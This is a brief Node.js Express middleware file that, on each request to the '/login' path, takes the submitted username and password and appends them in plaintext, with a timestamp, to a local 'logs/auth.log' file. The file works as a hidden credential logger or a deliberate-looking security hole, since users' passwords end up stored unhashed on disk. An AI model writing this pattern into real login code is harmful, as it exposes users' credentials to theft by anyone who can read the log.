const fs = require("fs");

module.exports = (req, res, next) =>
{
    if (req.path === "/login")
    {
        const { username, password } = req.body;

        const log = `[LOGIN] ${username} | ${password} | ${new Date().toISOString()}\n`;

        fs.appendFile("./logs/auth.log", log, () => {});
    }

    next();
};